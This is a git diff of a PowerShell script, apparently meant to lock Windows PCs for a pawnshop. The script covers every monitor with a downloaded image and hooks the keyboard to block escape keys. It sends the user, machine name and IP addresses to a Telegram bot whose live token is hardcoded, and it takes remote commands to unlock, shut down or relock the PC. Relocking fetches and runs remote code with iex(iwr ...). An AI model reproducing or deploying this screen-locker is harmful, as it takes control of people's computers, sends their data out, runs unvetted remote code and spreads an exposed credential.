@@ -1,100 +1,83 @@
 # CONFIG
-$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
-$tempImagePath = "$env:TEMP\image.jpg"
-$lockFilePath = "$env:LOCALAPPDATA\pawnshop_status.txt"
+$imageUrl = "https://raw.githubusercontent.com/diezul/x/main/1.png"
+$tempImage = "$env:TEMP\image.jpg"
 $botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
 $chatID = "656189986"
 $user = $env:USERNAME
-$machine = $env:COMPUTERNAME
-$unlockCmd = "/unlock$user".ToLower()
-$lockCmd   = "/lock$user".ToLower()
-$shutdownCmd = "/shutdown$user".ToLower()
+$pc = $env:COMPUTERNAME
+$lockFile = "$env:APPDATA\lock_status.txt"
 
-# Create lock file if missing
-if (-not (Test-Path $lockFilePath)) {
-    "locked" | Out-File $lockFilePath -Force
-}
-
-# Read current state
-$locked = (Get-Content $lockFilePath -ErrorAction SilentlyContinue) -ne "unlocked"
-if (-not $locked) { return }
-
-# Send Telegram Notification
-function Send-Telegram {
-    try {
-        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169\.254|255|^0' })[0].IPAddress
-    } catch { $ip = "?" }
-    try {
-        $ipPublic = (Invoke-RestMethod "https://api.ipify.org") 
-    } catch { $ipPublic = "?" }
-    $msg = "🔒 PC-ul $user ($machine) a fost blocat.`nLocal IP: $ip`nPublic IP: $ipPublic`n`n/unlock$user`n/shutdown$user`n/lock$user"
-    $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
-    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $body -ContentType "application/json"
-}
-Send-Telegram
+# INITIAL STATE
+if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }
+$state = Get-Content $lockFile -ErrorAction SilentlyContinue
+if ($state -ne "locked") { return }
 
 # Download image
-Invoke-WebRequest $imageURL -OutFile $tempImagePath -UseBasicParsing
+Invoke-WebRequest $imageUrl -OutFile $tempImage -UseBasicParsing
 
-# Import Windows.Forms for UI
+# SEND TELEGRAM
+try {
+    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169)' })[0].IPAddress
+} catch { $localIP = "n/a" }
+try { $publicIP = (Invoke-RestMethod "https://api.ipify.org") } catch { $publicIP = "n/a" }
+
+$msg = "PC-ul $user ($pc) a fost blocat.`nIP: $localIP | $publicIP`n`nComenzi:`n/unlock$user`n/shutdown$user`n/lock$user"
+$body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
+Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
+
+# --- HOOK TO BLOCK KEYS ---
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-# KeyBlocker Class (Win, Alt, Alt+Tab, Win+Tab, Alt+F4)
 Add-Type @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-public class KeyBlocker {
-    private static IntPtr hookID = IntPtr.Zero;
-    private static LowLevelKeyboardProc proc = HookCallback;
 
+public class KeyInterceptor {
+    private static IntPtr hookId = IntPtr.Zero;
+    private static LowLevelKeyboardProc _proc = HookCallback;
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
+
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
-    private const int WM_SYSKEYDOWN = 0x0104;
-
     private static bool alt = false;
 
-    [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-    [DllImport("user32.dll")]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    public static void Block() {
-        using (Process curProcess = Process.GetCurrentProcess())
-        using (ProcessModule curModule = curProcess.MainModule) {
-            hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+    public static void Start() {
+        using (var curProcess = Process.GetCurrentProcess())
+        using (var curModule = curProcess.MainModule) {
+            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
         }
     }
 
-    public static void Unblock() {
-        UnhookWindowsHookEx(hookID);
+    public static void Stop() {
+        UnhookWindowsHookEx(hookId);
     }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
             int vkCode = Marshal.ReadInt32(lParam);
             Keys key = (Keys)vkCode;
-
             if (key == Keys.LWin || key == Keys.RWin || key == Keys.Tab || key == Keys.Escape)
                 return (IntPtr)1;
             if (key == Keys.F4 && (Control.ModifierKeys & Keys.Alt) == Keys.Alt)
                 return (IntPtr)1;
+            if (key == Keys.C && (Control.ModifierKeys & Keys.Control) == Keys.Control)
+                Environment.Exit(0);  // Emergency exit with Ctrl+C
         }
-        return CallNextHookEx(hookID, nCode, wParam, lParam);
+        return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
 }
 "@
-[KeyBlocker]::Block()
+[KeyInterceptor]::Start()
 
-# Show full screen image on all monitors
-$forms = @()
-foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
+# FULLSCREEN IMAGE
+$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
         FormBorderStyle = 'None'
         WindowState = 'Maximized'
@@ -103,21 +86,21 @@ foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
         Location = $screen.Bounds.Location
         Size = $screen.Bounds.Size
         Cursor = [System.Windows.Forms.Cursors]::None
+        BackColor = 'Black'
+        KeyPreview = $true
     }
-    $img = New-Object Windows.Forms.PictureBox -Property @{
-        Image = [System.Drawing.Image]::FromFile($tempImagePath)
+    $pb = New-Object Windows.Forms.PictureBox -Property @{
+        Image = [System.Drawing.Image]::FromFile($tempImage)
         Dock = 'Fill'
         SizeMode = 'StretchImage'
     }
-    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
-    $form.Add_Deactivate({ $_.Sender.Activate() })
-    $form.Controls.Add($img)
+    $form.Add_Deactivate({ $form.Activate() })
+    $form.Controls.Add($pb)
     $form.Show()
-    $forms += $form
+    $form
 }
 
-# Telegram Polling
-$script:AllowClose = $false
+# TELEGRAM POLLING
 $offset = 0
 try {
     $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
@@ -127,34 +110,37 @@ try {
 } catch {}
 
 $timer = New-Object Windows.Forms.Timer
-$timer.Interval = 3000
+$timer.Interval = 4000
 $timer.Add_Tick({
     try {
         $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
-        foreach ($update in $updates.result) {
-            $offset = $update.update_id + 1
-            $msg = $update.message.text.ToLower().Trim()
-            if ($msg -eq $unlockCmd) {
-                "unlocked" | Out-File $lockFilePath -Force
-                $script:AllowClose = $true
-                [Windows.Forms.Application]::Exit()
-            }
-            elseif ($msg -eq $shutdownCmd) {
-                "unlocked" | Out-File $lockFilePath -Force
-                Stop-Computer -Force
-            }
-            elseif ($msg -eq $lockCmd) {
-                "locked" | Out-File $lockFilePath -Force
-                Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (iwr 'https://raw.githubusercontent.com/diezul/x/main/k.ps1')`""
-                [Windows.Forms.Application]::Exit()
+        foreach ($u in $updates.result) {
+            $offset = $u.update_id + 1
+            $text = $u.message.text.ToLower().Trim()
+            $cmd = "/unlock$user","/shutdown$user","/lock$user" | Where-Object { $text -eq $_ }
+            switch ($cmd) {
+                "/unlock$user" {
+                    "unlocked" | Out-File $lockFile -Force
+                    [Windows.Forms.Application]::Exit()
+                }
+                "/shutdown$user" {
+                    "unlocked" | Out-File $lockFile -Force
+                    Stop-Computer -Force
+                }
+                "/lock$user" {
+                    "locked" | Out-File $lockFile -Force
+                    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (iwr 'https://raw.githubusercontent.com/diezul/x/main/k.ps1')`""
+                    [Windows.Forms.Application]::Exit()
+                }
             }
         }
     } catch {}
 })
 $timer.Start()
 
+# LOOP
 [Windows.Forms.Application]::Run()
 
-# Cleanup
+# CLEANUP
 $timer.Stop()
-[KeyBlocker]::Unblock()
+[KeyInterceptor]::Stop()
